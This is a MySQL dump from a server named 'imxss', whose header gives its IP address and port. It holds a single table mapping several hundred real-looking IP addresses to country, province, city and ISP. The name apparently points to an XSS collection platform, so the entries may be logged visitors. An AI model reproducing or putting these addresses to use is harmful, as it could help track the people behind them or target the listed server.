/*
Navicat MySQL Data Transfer

Source Server         : imxss
Source Server Version : 50719
Source Host           : 45.113.160.49:52014
Source Database       : emaige

Target Server Type    : MYSQL
Target Server Version : 50719
File Encoding         : 65001

Date: 2017-09-30 12:59:04
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for address_info
-- ----------------------------
DROP TABLE IF EXISTS `address_info`;
CREATE TABLE `address_info` (
  `ip` varchar(32) NOT NULL,
  `country` varchar(64) DEFAULT NULL,
  `area` varchar(64) DEFAULT NULL,
  `region` varchar(64) DEFAULT NULL,
  `city` varchar(64) DEFAULT NULL,
  `isp` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of address_info
-- ----------------------------
INSERT INTO `address_info` VALUES ('1.160.86.57', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('1.164.13.18', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('1.165.161.86', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('1.180.237.236', '中国', '华北', '内蒙古自治区', '呼和浩特市', '电信');
INSERT INTO `address_info` VALUES ('1.192.32.67', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('1.193.121.136', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('1.229.101.134', '韩国', '', '', '', '');
INSERT INTO `address_info` VALUES ('1.30.7.156', '中国', '华北', '内蒙古自治区', '呼和浩特市', '联通');
INSERT INTO `address_info` VALUES ('1.58.60.164', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('1.83.125.184', '中国', '西北', '陕西省', '西安市', '电信');
INSERT INTO `address_info` VALUES ('101.200.128.174', '中国', '华北', '北京市', '北京市', '阿里云');
INSERT INTO `address_info` VALUES ('101.200.77.252', '中国', '华北', '北京市', '北京市', '阿里云');
INSERT INTO `address_info` VALUES ('101.226.125.104', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.125.111', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.125.121', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.125.15', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.206', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.208', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.216', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.219', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.220', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.226', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.227', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.238', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.239', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.33.240', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.64.177', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.65.102', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.66.192', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.89.121', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.226.99.195', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.8.224.212', '台湾', '', '台湾省', '', 'Taiwan Fixed Network');
INSERT INTO `address_info` VALUES ('101.81.117.224', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.81.54.240', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.85.128.114', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('101.88.127.63', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('103.213.245.207', '香港', '', '香港特别行政区', '', 'Hurricane Electric');
INSERT INTO `address_info` VALUES ('103.240.126.18', '中国', '华东', '江西省', '南昌市', '联通');
INSERT INTO `address_info` VALUES ('106.114.71.52', '中国', '华北', '河北省', '石家庄市', '电信');
INSERT INTO `address_info` VALUES ('106.117.93.231', '中国', '华北', '河北省', '石家庄市', '电信');
INSERT INTO `address_info` VALUES ('106.120.160.75', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('106.120.161.65', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('106.120.162.109', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('106.120.162.110', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('106.187.44.169', '日本', '', '', '', '');
INSERT INTO `address_info` VALUES ('106.19.14.150', '中国', '华中', '湖南省', '长沙市', '电信');
INSERT INTO `address_info` VALUES ('106.39.154.137', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('106.39.190.195', '中国', '华北', '北京市', '北京市', '电信');
INSERT INTO `address_info` VALUES ('106.47.151.142', '中国', '华北', '天津市', '天津市', '电信');
INSERT INTO `address_info` VALUES ('106.5.76.144', '中国', '华东', '江西省', '赣州市', '电信');
INSERT INTO `address_info` VALUES ('106.6.86.91', '中国', '华东', '江西省', '赣州市', '电信');
INSERT INTO `address_info` VALUES ('107.191.44.7', '美国', '', '', '', '');
INSERT INTO `address_info` VALUES ('110.152.101.140', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '电信');
INSERT INTO `address_info` VALUES ('110.152.102.193', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '电信');
INSERT INTO `address_info` VALUES ('110.184.20.29', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('110.185.39.67', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('110.252.90.89', '中国', '华北', '河北省', '沧州市', '联通');
INSERT INTO `address_info` VALUES ('111.1.221.25', '中国', '华东', '浙江省', '温州市', '移动');
INSERT INTO `address_info` VALUES ('111.13.7.120', '中国', '华北', '北京市', '北京市', '移动');
INSERT INTO `address_info` VALUES ('111.140.23.56', '中国', '华东', '浙江省', '杭州市', '铁通');
INSERT INTO `address_info` VALUES ('111.177.117.43', '中国', '华中', '湖北省', '襄樊市', '电信');
INSERT INTO `address_info` VALUES ('111.178.4.118', '中国', '华中', '湖北省', '孝感市', '电信');
INSERT INTO `address_info` VALUES ('111.201.233.60', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.201.242.140', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.206.221.106', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.206.221.29', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.206.221.32', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.206.221.50', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.206.221.66', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.206.221.96', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.206.222.53', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('111.22.4.122', '中国', '华中', '湖南省', '长沙市', '移动');
INSERT INTO `address_info` VALUES ('111.251.17.19', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('111.75.54.79', '中国', '华东', '江西省', '宜春市', '电信');
INSERT INTO `address_info` VALUES ('112.115.28.98', '中国', '西南', '云南省', '昆明市', '电信');
INSERT INTO `address_info` VALUES ('112.16.56.247', '中国', '华东', '浙江省', '温州市', '移动');
INSERT INTO `address_info` VALUES ('112.26.70.184', '中国', '华东', '安徽省', '淮南市', '移动');
INSERT INTO `address_info` VALUES ('112.27.254.1', '中国', '华东', '安徽省', '合肥市', '移动');
INSERT INTO `address_info` VALUES ('112.3.32.110', '中国', '华东', '江苏省', '盐城市', '移动');
INSERT INTO `address_info` VALUES ('112.37.122.110', '中国', '华东', '山东省', '聊城市', '移动');
INSERT INTO `address_info` VALUES ('112.64.24.162', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('112.65.193.15', '中国', '华东', '上海市', '上海市', '联通');
INSERT INTO `address_info` VALUES ('112.66.116.154', '中国', '华南', '海南省', '海口市', '电信');
INSERT INTO `address_info` VALUES ('112.66.75.222', '中国', '华南', '海南省', '海口市', '电信');
INSERT INTO `address_info` VALUES ('112.96.109.38', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('113.102.237.61', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('113.102.238.51', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('113.105.0.10', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('113.107.148.231', '中国', '华南', '广东省', '茂名市', '电信');
INSERT INTO `address_info` VALUES ('113.107.54.74', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('113.108.127.13', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('113.111.1.38', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.111.10.81', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.111.5.16', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.111.9.11', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.116.201.170', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('113.118.210.116', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('113.119.11.215', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.119.38.242', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.119.38.30', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.12.177.12', '中国', '华南', '广西壮族自治区', '南宁市', '电信');
INSERT INTO `address_info` VALUES ('113.201.122.247', '中国', '西北', '陕西省', '宝鸡市', '联通');
INSERT INTO `address_info` VALUES ('113.222.26.27', '中国', '华中', '湖南省', '株洲市', '电信');
INSERT INTO `address_info` VALUES ('113.224.228.43', '中国', '东北', '辽宁省', '沈阳市', '联通');
INSERT INTO `address_info` VALUES ('113.225.131.86', '中国', '东北', '辽宁省', '沈阳市', '联通');
INSERT INTO `address_info` VALUES ('113.247.12.237', '中国', '华中', '湖南省', '长沙市', '电信');
INSERT INTO `address_info` VALUES ('113.251.133.123', '中国', '西南', '重庆市', '重庆市', '电信');
INSERT INTO `address_info` VALUES ('113.57.153.34', '中国', '华中', '湖北省', '武汉市', '联通');
INSERT INTO `address_info` VALUES ('113.64.86.240', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.67.8.116', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.68.110.211', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.68.113.135', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('113.73.197.36', '中国', '华南', '广东省', '中山市', '电信');
INSERT INTO `address_info` VALUES ('113.87.184.76', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('113.91.54.42', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('113.94.214.26', '中国', '华南', '广东省', '阳江市', '电信');
INSERT INTO `address_info` VALUES ('113.99.0.109', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('114.225.47.56', '中国', '华东', '江苏省', '无锡市', '电信');
INSERT INTO `address_info` VALUES ('114.232.102.62', '中国', '华东', '江苏省', '南通市', '电信');
INSERT INTO `address_info` VALUES ('114.235.129.123', null, null, null, null, null);
INSERT INTO `address_info` VALUES ('114.249.242.153', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('114.252.162.65', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('114.27.102.144', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('114.35.44.95', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('114.47.94.126', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('114.85.59.146', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('114.91.25.104', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('114.95.191.170', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('115.151.4.192', '中国', '华东', '江西省', '宜春市', '电信');
INSERT INTO `address_info` VALUES ('115.159.157.108', '中国', '华东', '上海市', '上海市', '腾讯网络');
INSERT INTO `address_info` VALUES ('115.196.222.245', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('115.204.12.74', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('115.220.236.11', '中国', '华东', '浙江省', '宁波市', '电信');
INSERT INTO `address_info` VALUES ('115.239.138.180', '中国', '华东', '浙江省', '绍兴市', '电信');
INSERT INTO `address_info` VALUES ('115.239.212.137', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('115.47.118.244', '中国', '华北', '北京市', '北京市', '鹏博士');
INSERT INTO `address_info` VALUES ('115.47.40.191', '中国', '华北', '北京市', '北京市', '鹏博士');
INSERT INTO `address_info` VALUES ('115.51.115.116', '中国', '华中', '河南省', '洛阳市', '联通');
INSERT INTO `address_info` VALUES ('115.58.174.68', '中国', '华中', '河南省', '驻马店市', '联通');
INSERT INTO `address_info` VALUES ('115.60.2.20', '中国', '华中', '河南省', '郑州市', '联通');
INSERT INTO `address_info` VALUES ('116.10.56.198', '中国', '华南', '广西壮族自治区', '北海市', '电信');
INSERT INTO `address_info` VALUES ('116.11.199.167', '中国', '华南', '广西壮族自治区', '南宁市', '电信');
INSERT INTO `address_info` VALUES ('116.22.119.220', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('116.22.198.25', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('116.225.79.180', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.226.181.239', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.226.84.233', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.231.118.25', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.231.31.165', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.231.55.67', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.231.86.173', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.231.95.30', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.236.234.66', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.238.169.241', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('116.249.109.231', '中国', '西南', '云南省', '昆明市', '电信');
INSERT INTO `address_info` VALUES ('116.25.236.219', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('116.252.107.41', '中国', '华南', '广西壮族自治区', '南宁市', '电信');
INSERT INTO `address_info` VALUES ('116.27.46.239', '中国', '华南', '广东省', '茂名市', '电信');
INSERT INTO `address_info` VALUES ('116.48.137.94', '香港', '', '香港特别行政区', '', 'pccw');
INSERT INTO `address_info` VALUES ('116.7.226.66', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('117.119.75.45', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('117.135.141.227', '中国', '华东', '上海市', '上海市', '移动');
INSERT INTO `address_info` VALUES ('117.135.141.228', '中国', '华东', '上海市', '上海市', '移动');
INSERT INTO `address_info` VALUES ('117.136.40.214', '中国', '华南', '广东省', '深圳市', '移动');
INSERT INTO `address_info` VALUES ('117.136.54.125', '中国', '华北', '天津市', '天津市', '移动');
INSERT INTO `address_info` VALUES ('117.136.65.186', '中国', '西南', '四川省', '', '移动');
INSERT INTO `address_info` VALUES ('117.151.98.238', '中国', '华中', '湖北省', '武汉市', '移动');
INSERT INTO `address_info` VALUES ('117.174.91.73', '中国', '西南', '四川省', '资阳市', '移动');
INSERT INTO `address_info` VALUES ('117.191.17.227', '中国', '西北', '新疆维吾尔自治区', '乌鲁木齐市', '移动');
INSERT INTO `address_info` VALUES ('117.21.203.245', '中国', '华东', '江西省', '上饶市', '电信');
INSERT INTO `address_info` VALUES ('117.26.198.190', '中国', '华东', '福建省', '莆田市', '电信');
INSERT INTO `address_info` VALUES ('117.40.238.176', '中国', '华东', '江西省', '萍乡市', '电信');
INSERT INTO `address_info` VALUES ('117.80.29.139', '中国', '华东', '江苏省', '苏州市', '电信');
INSERT INTO `address_info` VALUES ('117.88.8.145', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('117.89.215.158', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('118.112.142.84', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.112.91.162', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.113.137.136', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.113.41.76', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.114.215.39', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.114.221.99', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.116.89.90', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.116.93.94', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.116.94.179', '中国', '西南', '四川省', '成都市', '电信');
INSERT INTO `address_info` VALUES ('118.163.19.51', '台湾', '', '台湾省', '', '中华电信');
INSERT INTO `address_info` VALUES ('118.89.169.237', '中国', '华东', '上海市', '上海市', '腾讯网络');
INSERT INTO `address_info` VALUES ('119.101.196.102', '中国', '华中', '湖北省', '十堰市', '电信');
INSERT INTO `address_info` VALUES ('119.123.178.78', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('119.129.224.182', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.104.242', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.104.248', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.104.78', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.105.110', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.105.182', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.105.65', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.16.188', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.16.241', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.17.179', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.17.190', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.17.75', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.18.245', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.15', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.171', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.175', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.42', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.19.79', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.130.70.95', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.131.117.13', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('119.221.37.62', '韩国', '', '', '', '');
INSERT INTO `address_info` VALUES ('119.233.227.87', '中国', '华东', '福建省', '厦门市', '广电网');
INSERT INTO `address_info` VALUES ('119.251.197.43', '中国', '华北', '河北省', '沧州市', '联通');
INSERT INTO `address_info` VALUES ('119.251.198.211', '中国', '华北', '河北省', '沧州市', '联通');
INSERT INTO `address_info` VALUES ('119.28.136.11', '中国', '华北', '北京市', '北京市', '腾讯网络');
INSERT INTO `address_info` VALUES ('119.41.6.193', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('119.53.112.113', '中国', '东北', '吉林省', '长春市', '联通');
INSERT INTO `address_info` VALUES ('119.77.175.123', '台湾', '', '台湾省', '', 'Taiwan Fixed Network');
INSERT INTO `address_info` VALUES ('119.86.43.13', '中国', '西南', '重庆市', '重庆市', '电信');
INSERT INTO `address_info` VALUES ('119.96.7.93', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('119.97.197.2', '中国', '华中', '湖北省', '武汉市', '电信');
INSERT INTO `address_info` VALUES ('120.10.145.29', '中国', '华北', '河北省', '沧州市', '联通');
INSERT INTO `address_info` VALUES ('120.14.162.238', '中国', '华北', '河北省', '邢台市', '联通');
INSERT INTO `address_info` VALUES ('120.15.90.121', '中国', '华北', '河北省', '衡水市', '联通');
INSERT INTO `address_info` VALUES ('120.195.70.114', '中国', '华东', '江苏省', '南京市', '移动');
INSERT INTO `address_info` VALUES ('120.241.73.4', '中国', '华南', '广东省', '广州市', '移动');
INSERT INTO `address_info` VALUES ('120.36.86.29', '中国', '华东', '福建省', '福州市', '电信');
INSERT INTO `address_info` VALUES ('120.37.114.207', '中国', '华东', '福建省', '泉州市', '电信');
INSERT INTO `address_info` VALUES ('120.43.93.97', '中国', '华东', '福建省', '龙岩市', '电信');
INSERT INTO `address_info` VALUES ('120.85.157.252', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.112', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.140', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.147', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.149', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.167', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.17', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.181', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.189', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.20', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.215', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.225', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.228', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.231', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.236', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.24', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.31', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.41', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.68', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.78', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.84', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.96', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.158.98', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.76.223', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.76.60', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('120.85.76.85', '中国', '华南', '广东省', '广州市', '联通');
INSERT INTO `address_info` VALUES ('121.13.154.55', '中国', '华南', '广东省', '东莞市', '电信');
INSERT INTO `address_info` VALUES ('121.229.16.236', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('121.237.241.128', '中国', '华东', '江苏省', '南京市', '电信');
INSERT INTO `address_info` VALUES ('121.32.12.64', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.32.12.71', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.32.126.166', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.32.13.26', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.33.144.209', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.33.144.47', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.33.146.150', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.33.20.24', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('121.35.189.98', '中国', '华南', '广东省', '深圳市', '电信');
INSERT INTO `address_info` VALUES ('121.58.69.2', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('122.114.153.150', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('122.114.193.157', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('122.114.223.118', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('122.114.45.69', '中国', '华中', '河南省', '郑州市', '电信');
INSERT INTO `address_info` VALUES ('122.159.249.117', '中国', '东北', '黑龙江省', '哈尔滨市', '联通');
INSERT INTO `address_info` VALUES ('122.188.101.29', '中国', '华中', '湖北省', '鄂州市', '联通');
INSERT INTO `address_info` VALUES ('122.190.94.171', '中国', '华中', '湖北省', '荆州市', '联通');
INSERT INTO `address_info` VALUES ('122.190.94.201', '中国', '华中', '湖北省', '荆州市', '联通');
INSERT INTO `address_info` VALUES ('122.224.191.122', '中国', '华东', '浙江省', '杭州市', '电信');
INSERT INTO `address_info` VALUES ('122.226.183.155', '中国', '华东', '浙江省', '台州市', '电信');
INSERT INTO `address_info` VALUES ('122.226.188.248', '中国', '华东', '浙江省', '台州市', '电信');
INSERT INTO `address_info` VALUES ('122.227.189.204', '中国', '华东', '浙江省', '宁波市', '电信');
INSERT INTO `address_info` VALUES ('122.228.189.114', '中国', '华东', '浙江省', '温州市', '电信');
INSERT INTO `address_info` VALUES ('122.228.189.21', '中国', '华东', '浙江省', '温州市', '电信');
INSERT INTO `address_info` VALUES ('122.231.155.102', '中国', '华东', '浙江省', '嘉兴市', '电信');
INSERT INTO `address_info` VALUES ('122.4.237.227', '中国', '华东', '山东省', '潍坊市', '电信');
INSERT INTO `address_info` VALUES ('122.5.182.11', '中国', '华东', '山东省', '德州市', '电信');
INSERT INTO `address_info` VALUES ('123.10.147.31', '中国', '华中', '河南省', '商丘市', '联通');
INSERT INTO `address_info` VALUES ('123.103.77.200', '中国', '华北', '北京市', '北京市', '网宿科技');
INSERT INTO `address_info` VALUES ('123.103.79.200', '中国', '华北', '北京市', '北京市', '网宿科技');
INSERT INTO `address_info` VALUES ('123.103.79.249', '中国', '华北', '北京市', '北京市', '网宿科技');
INSERT INTO `address_info` VALUES ('123.113.144.223', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.113.158.76', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.116.230.34', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.116.77.215', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.120.145.186', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('123.120.172.36', '中国', '华北', '北京市', '北京市', '联通');
